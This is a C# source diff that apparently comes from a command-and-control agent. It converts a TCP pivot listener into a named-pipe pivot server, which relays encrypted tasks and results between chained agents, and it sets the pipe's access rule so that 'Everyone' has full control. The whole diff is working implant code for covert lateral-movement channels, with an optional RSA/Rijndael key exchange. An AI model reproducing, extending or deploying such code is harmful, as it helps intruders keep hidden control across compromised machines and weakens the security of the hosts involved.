@@ -2,9 +2,11 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Pipes;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
@@ -15,81 +17,59 @@ using Agent.Models;
 
 namespace Agent.Service.Pivoting
 {
-    public class PivotTCPServer : PivotServer
+    public class PivotPipeServer : PivotServer
     {
 
-        public PivotTCPServer(ConnexionUrl conn) : base(conn)
+        public PivotPipeServer(ConnexionUrl conn) : base(conn)
         {
+        }
+
+        protected PipeSecurity CreatePipeSecurityForEveryone()
+        {
+            PipeSecurity pipeSecurity = new PipeSecurity();
+            pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
+            return pipeSecurity;
         }
 
 
         public override async Task Start()
         {
-            try
+            this.Status = RunningService.RunningStatus.Running;
+
+            while (!this._tokenSource.IsCancellationRequested)
             {
-                this.Status = RunningService.RunningStatus.Running;
-
-                var listener = new TcpListener(IPAddress.Parse(Connexion.Address), this.Connexion.Port);
-                listener.Start(100);
-
-                while (!_tokenSource.IsCancellationRequested)
+                try
                 {
-                    // this blocks until a connection is received or token is cancelled
-                    var client = await listener.AcceptTcpClientAsync(_tokenSource);
+                    using (NamedPipeServerStream server = new NamedPipeServerStream(this.Connexion.PipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 512, 512, CreatePipeSecurityForEveryone(), HandleInheritability.None))
+                    {
+                        Task connectionTask = Task.Factory.FromAsync(server.BeginWaitForConnection, server.EndWaitForConnection, null);
+                        await connectionTask;
 
-                    // do something with the connected client
-                    var thread = new Thread(async () => await HandleClient(client));
-                    thread.Start();
+                        if (this.Connexion.IsSecure)
+                            HandleSecureClient(server);
+                        else
+                            HandleNonSecureClient(server);
+
+                        var reader = new StreamReader(server); //ack end oth message
+                        reader.ReadLine();
+
+                        if (server.IsConnected)
+                            server.Disconnect();
+                    }
                 }
-                // handle client in new thread
-
-                listener.Stop();
-            }
-            finally
-            {
-                this.Status = RunningService.RunningStatus.Stoped;
-            }
-        }
-
-        private async Task HandleClient(TcpClient client)
-        {
-            if (client == null)
-                return;
-
-            var endpoint = (IPEndPoint)client.Client.RemoteEndPoint;
-            var id = endpoint.Address + ":" + endpoint.Port;
-
-            try
-            {
-                while (!_tokenSource.IsCancellationRequested && client.IsAlive())
+                catch (Exception ex)
                 {
-
-                    // read from client
-                    if (!client.DataAvailable())
-                        continue;
-
-                    if (this.Connexion.IsSecure)
-                        HandleSecureClient(client);
-                    else
-                        HandleNonSecureClient(client);
-                }
-
-                // sos cpu
-                await Task.Delay(10);
-            }
-            catch (Exception ex)
-            {
 #if DEBUG
-                Debug.WriteLine(ex);
+                    Console.WriteLine(ex.ToString());
 #endif
+                }
             }
-            finally
-            {
-                Debug.WriteLine($"TCP Pivot {id} : disconnected");
-            }
+
+            this.Status = RunningService.RunningStatus.Stoped;
         }
 
-        private void HandleNonSecureClient(TcpClient client)
+
+        private void HandleNonSecureClient(NamedPipeServerStream client)
         {
             var req = client.ReceivedMessage();
             //Convert.FromBase64String(b64results).Deserialize<List<MessageResult>>();
@@ -103,8 +83,9 @@ namespace Agent.Service.Pivoting
             client.SendMessage(tasks.Serialize());
         }
 
-        private void HandleSecureClient(TcpClient client)
+        private void HandleSecureClient(NamedPipeServerStream client)
         {
+            var reader = new StreamReader(client);
             //receive public key
             string xmlPubKey = Encoding.UTF8.GetString(client.ReceivedMessage(true));
             RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
@@ -119,23 +100,24 @@ namespace Agent.Service.Pivoting
             //Send symetric Key & IV
             byte[] encryptedKey = rsa.Encrypt(rijndael.Key, false);
             byte[] encryptedIV = rsa.Encrypt(rijndael.IV, false);
-
+            
             byte[] encryptedKeyIV = new byte[encryptedKey.Length + encryptedIV.Length];
             System.Buffer.BlockCopy(encryptedKey, 0, encryptedKeyIV, 0, encryptedKey.Length);
             System.Buffer.BlockCopy(encryptedIV, 0, encryptedKeyIV, encryptedKey.Length, encryptedIV.Length);
 
-            Debug.WriteLine($"TCPS Pivot : EncryptedKeyIV = {encryptedKeyIV.Length} " + string.Join(",", encryptedKeyIV.Select(a => ((int)a).ToString())));
+            //Debug.WriteLine($"PipeS Pivot : EncryptedKeyIV = {encryptedKeyIV.Length} " + string.Join(",", encryptedKeyIV.Select(a => ((int)a).ToString())));
             client.SendMessage(encryptedKeyIV);
 
+
             var req = client.ReceivedMessage(true);
-            //Debug.WriteLine("TCPS Pivot : Encrypted Message (read " + req.Length + ") = " + string.Join(",", req.Select(a => ((int)a).ToString())));
+            //Debug.WriteLine("Pipes Pivot : Encrypted Message (read " + req.Length + ") = " + string.Join(",", req.Select(a => ((int)a).ToString())));
             byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(req, 0, req.Length);
             var responses = decryptedBytes.Deserialize<List<MessageResult>>();
             _messageService.EnqueueResults(responses);
 
             var relays = this.ExtractRelays(responses);
 
-            Debug.WriteLine($"TCPS Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
+            Debug.WriteLine($"Pipes Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
             var tasks = this._messageService.GetMessageTasksToRelay(relays);
 
             var meesage = tasks.Serialize();
